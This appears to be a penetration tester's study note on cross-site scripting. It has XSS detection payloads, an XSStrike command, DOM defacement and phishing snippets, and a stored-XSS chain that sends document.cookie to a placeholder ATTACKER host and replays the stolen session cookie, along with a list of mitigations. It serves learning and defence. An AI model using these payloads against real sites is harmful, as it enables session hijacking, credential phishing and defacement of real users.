# Cross-Site Scripting (XSS)

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Inject JavaScript that runs in another user's browser. Three types: **reflected** (in the response to a request), **stored** (saved server-side, hits every viewer), **DOM** (client-side JS sink).

## Detection & basic payloads
```html
<script>alert(window.origin)</script>       <!-- classic PoC (window.origin confirms context) -->
<img src=x onerror=alert(document.cookie)>   <!-- when <script> is filtered -->
<plaintext>                                   <!-- breaks page = injection point found -->
"><script>alert(1)</script>                   <!-- break out of an attribute first -->
```
Find the context (HTML body / attribute / JS / URL) → craft the break-out. Automate discovery with **XSStrike** (`xsstrike.py -u "http://t/?x=test"`).

## DOM manipulation (impact demo)
```html
<script>document.title='pwned'</script>
<script>document.getElementById('loginform').innerHTML='<form action=//ATTACKER>...'</script>  <!-- phishing/defacement -->
```

## Session hijacking via XSS (stored XSS → cookie theft)
Highest-impact XSS. Inject a script that exfils the victim's cookie to your server, then replay it:
```html
<script src="http://ATTACKER/s.js"></script>
<!-- s.js: new Image().src='http://ATTACKER/?c='+document.cookie; -->
```
- A simple logger on your side records the cookie (backend source not stored here).
- **Replay:** set the stolen `PHPSESSID` in your browser (DevTools → Storage → Cookies) → refresh → you're the victim.
- **Mitigation that kills this:** `HttpOnly` cookie flag (JS can't read it). Also CSP, output encoding.

## Fix
Context-aware **output encoding** (HTML/attr/JS/URL), input validation, CSP, `HttpOnly`+`Secure` cookies, frameworks that auto-escape.

> Workflow: find the sink → confirm with `alert(window.origin)` → identify stored vs reflected (stored = far worse, hits everyone) → demo real impact with cookie theft. `HttpOnly` is the one flag that defuses cookie-stealing XSS.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
